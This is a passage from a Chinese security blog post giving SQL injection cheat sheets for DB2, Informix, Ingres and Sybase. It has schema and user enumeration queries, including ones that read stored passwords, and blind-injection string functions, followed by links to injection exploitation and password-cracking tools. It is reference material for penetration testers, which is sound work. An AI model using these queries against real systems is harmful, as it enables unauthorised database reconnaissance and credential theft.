<td><code>SELECT name, tbname, coltype FROM sysbibm.syscolumns;</code></td>
</tr>
</tbody></table>
<ol start="2">
<li>SQL盲注函数：DB2</li>
</ol>
<p>SQL盲注函数</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查  询</th>
</tr>
</thead>
<tbody><tr>
<td>字符串长度</td>
<td><code>LENGTH()</code></td>
</tr>
<tr>
<td>从给定字符串中提取子串</td>
<td><code>SUBSTRING(string,offset,length) FROM  sysibm.sysdummyl;</code></td>
</tr>
<tr>
<td>字符串(‘ABC’)不带单引号的表示方式</td>
<td>`SELECT CHR(65)</td>
</tr>
</tbody></table>
<h4 id="Informix-备忘单"><a href="#Informix-备忘单" class="headerlink" title="Informix 备忘单"></a>Informix 备忘单</h4><p>Informix数据库服务器也是由IBM负责经销的，相比其他数据库平台，它不是很常见。</p>
<ol>
<li>枚举数据库配置信息和模式</li>
</ol>
<p>提取Informix数据库的配置信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>版本</td>
<td><code>SELECT DBINFO('version','full') FROM systables WHERE tabid = 1;</code></td>
</tr>
<tr>
<td>当前用户</td>
<td><code>SELECT USER FROM systables WHERE tabid = 1;</code></td>
</tr>
<tr>
<td>列出用户</td>
<td><code>select usertype,username,password from sysusers;</code></td>
</tr>
<tr>
<td>当前用户权限</td>
<td><code>select tabname, tabauth, grantor, grantee FROM systabauth join systables on systables.tabid = systabauth.tabid</code></td>
</tr>
<tr>
<td>数据库服务器主机名</td>
<td><code>SELECT DBINFO('dbhostname') FROM systables WHERE tabid=1;</code></td>
</tr>
</tbody></table>
<p> 提取Informix数据库的模式信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td><code>SELECT DBSERVERNAME FROM systables WHERE tabid = 1;</code></td>
</tr>
<tr>
<td>列出数据库</td>
<td><code>SELECT name, owner FROM sysdatabases;</code></td>
</tr>
<tr>
<td>列出表</td>
<td><code>SELECT tabname FROM systables; </code><br><code> SELECT tabname, viewtext FROM sysviews join systables on systables.tabid = sysviews.tabid;</code></td>
</tr>
<tr>
<td>列出列</td>
<td><code>SELECT tabname, colname, coltype FROM  syscolumns join systables on  syscolumns.tabid = systables.tabid;</code></td>
</tr>
</tbody></table>
<ol start="2">
<li>SQL 盲注函数：Informix</li>
</ol>
<p>SQL盲注函数</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查  询</th>
</tr>
</thead>
<tbody><tr>
<td>字符串长度</td>
<td><code>LENGTH()</code></td>
</tr>
<tr>
<td>从给定字符串中提取子串</td>
<td><code>SELECT SUBSTRING('ABCD' FROM 4 FOR 1) FROM  systables where tabid = 1;  --返回'D';</code></td>
</tr>
<tr>
<td>字符串(‘ABC’)不带单引号的表示方式</td>
<td>`SELECT CHR(65)</td>
</tr>
</tbody></table>
<h4 id="Ingres-备忘单"><a href="#Ingres-备忘单" class="headerlink" title="Ingres 备忘单"></a>Ingres 备忘单</h4><p>Ingres是一种可以在所有主流操作系统上使用的开源数据库。</p>
<ol>
<li>枚举数据库配置信息和模式</li>
</ol>
<p>提取Ingres数据库的配置信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>版本</td>
<td><code>SELECT dbsminfo('version');</code></td>
</tr>
<tr>
<td>当前用户</td>
<td><code>SELECT dbsminfo('system user');</code><br><code> SELECT dbsminfo('session user');</code></td>
</tr>
<tr>
<td>列出用户</td>
<td><code>SELECT name, password FROM iiuser;</code></td>
</tr>
<tr>
<td>当前用户权限</td>
<td><code>SELECT dbsminfo('select_syscat');</code><br><code>SELECT dbsminfo('db_privileges');</code><br><code>SELECT  dbsminfo('current_priv_mask'); </code><br><code>SELECT dbsminfo('db_admin');</code><br><code>SELECT dbsminfo('security_priv');</code><br><code>SELECT dbsminfo('create_table'); </code><br><code>SELECT dbsminfo('create procedure');</code></td>
</tr>
</tbody></table>
<p> 提取Ingres数据库的模式信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td><code>SELECT dbmsinfo(database');</code></td>
</tr>
<tr>
<td>列出表</td>
<td><code>SELECT relid, relowner, relloc FROM iirelation WHERE relowner != '$ingres';</code></td>
</tr>
<tr>
<td>列出列</td>
<td><code>SELECT column_name, column_datatype,  table_name, table_owner FROM iicolumns;</code></td>
</tr>
</tbody></table>
<ol start="2">
<li>SQL盲注函数：Ingres</li>
</ol>
<p>SQL盲注函数</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>字符串长度</td>
<td><code>LENGTH()</code></td>
</tr>
<tr>
<td>从给定字符串中提取子串</td>
<td><code>SELECT substr(string, offset, length); -- </code></td>
</tr>
<tr>
<td>字符串(‘ABC’)不带单引号的表示方式</td>
<td>`SELECT chr(65)</td>
</tr>
</tbody></table>
<h4 id="Sybase-备忘单"><a href="#Sybase-备忘单" class="headerlink" title="Sybase 备忘单"></a>Sybase 备忘单</h4><p>Sybase与Microsoft SQL Server共享了共同的遗产，在Microsoft SQL Server中使用的很多 方法对于Sybase同样有效，往往只须在所用命令的语法上稍加修改即可。</p>
<ol>
<li>枚举数据库配置信息和模式</li>
</ol>
<p>提取Sybase数据库的配置信息</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>数   据</td>
<td>查   询</td>
</tr>
<tr>
<td>版本</td>
<td><code>SELECT @@version;</code></td>
</tr>
<tr>
<td>当前用户</td>
<td><code>SELECT username();</code><br><code> SELECT suser_name();</code><br><code> SELECT user;</code></td>
</tr>
<tr>
<td>列出用户</td>
<td><code>SELECT name FROM master..syslogins;</code></td>
</tr>
<tr>
<td>当前用户权限</td>
<td><code>SELECT show role(); </code><br><code> EXEC sp_helprotect &lt;user&gt;;</code></td>
</tr>
</tbody></table>
<p>提取Sybase数据库的模式信息</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td><code>SELECT db_name();</code></td>
</tr>
<tr>
<td>列出数据库</td>
<td><code>SELECT name FROM master..sysdatabases;</code></td>
</tr>
<tr>
<td>列出表</td>
<td>列出当前数据库中的表： <br><code>SELECT name FROM sysobjects WHERE type='U'; </code><br><code>SELECT name FROM sysobjects WHERE type='V'-- 视图 </code><br>列出master数据库中的表： <br><code>SELECT name FROM master..sysobjects WHERE type= 'U';</code><br><code>SELECT name FROM  master..sysobjects WHERE type='V';</code></td>
</tr>
<tr>
<td>列出列</td>
<td>列出当前数据库中tblUsers表的各个列的名称：<br><code>SELECT name FROM syscolumns WHERE  id=object_ id('tblUsers');</code><br>  列出admin数据库中tblUsers表的各个列的名称：<br><code>  SELECT  name FROM admin..syscolumns WHERE id=object_id('admin..tblUsers');</code></td>
</tr>
</tbody></table>
<ol start="2">
<li>SQL盲注函数：Sybase</li>
</ol>
<p>SQL盲注函数</p>
<table>
<thead>
<tr>
<th>数   据</th>
<th>查   询</th>
</tr>
</thead>
<tbody><tr>
<td>字符串长度</td>
<td><code>LEN();</code></td>
</tr>
<tr>
<td>从给定字符串中提取子串</td>
<td><code>SUBSTRING(string,offset,length);</code></td>
</tr>
<tr>
<td>字符串(‘ABC’)不带单引号的表示方式</td>
<td><code>SELECT char(65)+char(66)+char(67);</code></td>
</tr>
</tbody></table>
<h4 id="Microsoft-Access"><a href="#Microsoft-Access" class="headerlink" title="Microsoft Access"></a>Microsoft Access</h4><p>Microsoft Access数据库无法很好地适应企业级应用，所以通常只在具有极小数据库需求 的应用中才会遇到。</p>
<h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><h4 id="SQL注入白皮书"><a href="#SQL注入白皮书" class="headerlink" title="SQL注入白皮书"></a>SQL注入白皮书</h4><ul>
<li>Victor Chapela 撰写的 “Advanced SQL Injection” : <a href="www.owasp.org/index.php/Image:Advanced_SQL_Injection.ppt">www.owasp.org/index.php/Image:Advanced_SQL_Injection.ppt</a></li>
<li>Chris Anley撰写的”Advanced SQL Injection in SQL Server Applications”：<a target="_blank" rel="noopener" href="http://www.ngssoftware.com/papers/advanced_sql_injection.pdf">www.ngssoftware.com/papers/advanced_sql_injection.pdf</a></li>
<li>Gary O’Leary-Steele撰写的”Buffer Truncation Abuse in.NET and Microsoft SQL<br>Server”：<a target="_blank" rel="noopener" href="http://scanner.sec-1.com/resources/bta.pdf">http://scanner.sec-1.com/resources/bta.pdf</a></li>
<li>Brett Moore撰写的”Access through Access”：<a target="_blank" rel="noopener" href="http://www.insomniasec.com/publications/Access-Through-Access.pdf">www.insomniasec.com/publications/Access-Through-Access.pdf</a></li>
<li>Chema Alonso撰写的”Time-Based Blind SQL Injection with Heavy Queries”：<a target="_blank" rel="noopener" href="http://technet.microsoft.com/en-us/library/cc512676.aspx">http://technet.microsoft.com/en-us/library/cc512676.aspx</a></li>
</ul>
<h4 id="SQL注入备忘单"><a href="#SQL注入备忘单" class="headerlink" title="SQL注入备忘单"></a>SQL注入备忘单</h4><ul>
<li><p>PentestMonkey.com 针对 Oracle、Microsoft SQL Server、MySQL、PostgreSQL、Ingres、DB2 和 Informix 的 SQL 注入备忘单：<a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheets/">http://pentestmonkey.net/cheat-sheets/</a> </p>
</li>
<li><p>Michaeldaw.org 针对 Sybase、MySQL、OraclePostgreSQL、DB2 和 Ingres 的 SQL 注 入备忘单：<a target="_blank" rel="noopener" href="http://michaeldaw.org/sql-injection-cheat-sheet/">http://michaeldaw.org/sql-injection-cheat-sheet/</a></p>
</li>
<li><p>Ferruh Mavituna 针对 MySQL、SQL Server、PostgreSQL 和 Oracle 的 SQL 注入备忘单： <a target="_blank" rel="noopener" href="http://ferruh.mavituna.com/sql-injection-cheatssheet-oku/">http://ferruh.mavituna.com/sql-injection-cheatssheet-oku/</a></p>
</li>
<li><p>Ferruh Mavituna 针对 Oracle 的 SQL 注入备忘单：<a target="_blank" rel="noopener" href="http://ferruh.mavituna.com/oracle-injection-cheat-sheet-oku/">http://ferruh.mavituna.com/oracle-injection-cheat-sheet-oku/</a></p>
</li>
</ul>
<h4 id="SQL注入利用工具"><a href="#SQL注入利用工具" class="headerlink" title="SQL注入利用工具"></a>SQL注入利用工具</h4><ul>
<li><p>Absinthe 是一款基于 Windows GUI 的利用工具，支持 Microsoft SQL Server、Oracle、PostgreSQL 和 Sybase，并使用 SQL 盲注和基于错误的 SQL 注入：<a target="_blank" rel="noopener" href="http://www.0x90.org/releases/absinthe/">www.0x90.org/releases/absinthe/</a></p>
</li>
<li><p>SQLBrute是一款基于时间和错误的SQL盲注工具，支持Microsoft SQL Server和Oracle： <a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/SQLBruteo">https://github.com/GDSSecurity/SQLBruteo</a></p>
</li>
<li><p>Bobcat 是一款基于 Windows GUI 的工具，支持 Microsoft SQL Server 漏洞利用：<a target="_blank" rel="noopener" href="http://web.mac.com/nmonkee/pub/bobcat.html">http://web.mac.com/nmonkee/pub/bobcat.html</a> </p>
</li>
<li><p>BSQL Hacker在SQL注入利用领域是一款相对较新的工具。是一种基于Windows的GUI 应用程序，支持Microsoft SQL Server、Oracle和MySQL,并支持SQL盲注和基于错误的 SQL 注入技术：<a target="_blank" rel="noopener" href="http://labs.portcullis.co.uk/application/bsql-hacker/">http://labs.portcullis.co.uk/application/bsql-hacker/</a></p>
</li>
<li><p>很多攻击者认为SQLMap是目前最好的SQL注入漏洞利用工具：<a target="_blank" rel="noopener" href="http://sqlmap.source-fbrge.net/">http://sqlmap.source- fbrge.net/</a></p>
</li>
<li><p>Sqlninja是一款使用Perl编写的且关注获取代码执行的Microsoft SQL注入工具：<a target="_blank" rel="noopener" href="http://sqlninja.sourceforge.net/">http://sqlninja.sourceforge.net/</a></p>
</li>
<li><p>Squeeza被作为BlackHat展示的一部分发布。它关注的是可选的通信通道，支持Microsoft SQL Server： <a target="_blank" rel="noopener" href="http://www.sensepost.com/research/squeezao">www.sensepost.com/research/squeezao</a></p>
</li>
</ul>
<h4 id="口令破解工具"><a href="#口令破解工具" class="headerlink" title="口令破解工具"></a>口令破解工具</h4><ul>
<li><p>Cain &amp; Abel： <a target="_blank" rel="noopener" href="http://www.oxid.it/">www.oxid.it</a></p>
</li>
<li><p>Woraauthbf： <a target="_blank" rel="noopener" href="http://www.soonerorlater.hu/index.khtml?article_id=513">www.soonerorlater.hu/index.khtml?article_id=513</a></p>
</li>
<li><p>Checkpwd: <a target="_blank" rel="noopener" href="http://www.red-database-security.com/software/checkpwd.html">www.red-database-security.com/software/checkpwd.html</a></p>
</li>
<li><p>John the Ripper： <a target="_blank" rel="noopener" href="http://www.openwall.com/john/">www.openwall.com/john/</a></p>
</li>
</ul>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">0xdadream</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://0xdadream.github.io/2021/07/19/sql/">https://0xdadream.github.io/2021/07/19/sql/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">0xdadream</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/sql/">
                                    <span class="chip bg-color">sql</span>
                                </a>
                            
                                <a href="/tags/%E5%AD%A6%E4%B9%A0/">
                                    <span class="chip bg-color">学习</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: '8bNIlpEr08g4V4XysfF9PwEx-gzGzoHsz',
        appKey: 'TlwBq6NRJV9V5XcmP3fAXKls',
        serverURLs: 'https://8bnilper.lc-cn-n1-shared.com',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2021/07/20/html-zhuan-yi-zi-fu/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/34.jpg" class="responsive-img" alt="HTML转义字符">
                        
                        <span class="card-title">HTML转义字符</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            HTML转义字符
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-20
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/tip/" class="post-category">
                                    tip
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/tip/">
                        <span class="chip bg-color">tip</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2021/06/01/mysql-zhong-de-zi-fu-lian-jie/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="mysql中的字符连接">
                        
                        <span class="card-title">mysql中的字符连接</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            mysql中的字符连接
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-01
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/web/" class="post-category">
                                    web
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/sql/">
                        <span class="chip bg-color">sql</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: 逐梦<br />'
            + '文章作者: 0xdadream<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <a href="/about" target="_blank">0xdadream</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">209.4k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>


            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/0xdadream" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:320088413@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=320088413" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 320088413" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>





    <a href="https://www.zhihu.com/people/zhu-meng-16-1" class="tooltipped" target="_blank" data-tooltip="关注我的知乎: https://www.zhihu.com/people/zhu-meng-16-1" data-position="top" data-delay="50">
        <i class="fab fa-zhihu1">知</i>
    </a>



    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

